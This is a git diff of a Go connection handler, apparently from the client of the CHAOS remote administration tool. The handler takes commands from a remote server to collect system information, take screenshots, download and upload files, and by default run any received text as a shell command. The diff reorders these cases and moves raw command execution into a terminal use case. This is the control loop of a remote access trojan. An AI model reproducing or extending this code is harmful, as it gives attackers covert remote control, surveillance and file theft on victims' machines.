@@ -1,11 +1,9 @@
 package connection
 
 import (
-	"fmt"
 	log "github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/client/app/handler"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase"
-	"github.com/tiagorlampert/CHAOS/client/app/util"
 	"github.com/tiagorlampert/CHAOS/client/app/util/network"
 	"io"
 	"net"
@@ -42,14 +40,14 @@ func (c ConnectionHandler) Handle() error {
 		switch strings.TrimSpace(string(message)) {
 		case "information":
 			c.UseCase.Information.Collect()
-		case "download":
-			c.UseCase.Download.File()
 		case "screenshot":
 			c.UseCase.Screenshot.TakeScreenshot()
+		case "download":
+			c.UseCase.Download.File()
+		case "upload":
+			c.UseCase.Upload.ValidatePath()
 		default:
-			fmt.Println("Message from server: " + string(message))
-			response := util.RunCmd(string(message), 10)
-			_ = network.Send(c.Connection, response)
+			c.UseCase.Terminal.Run(string(message))
 		}
 	}
 	return nil
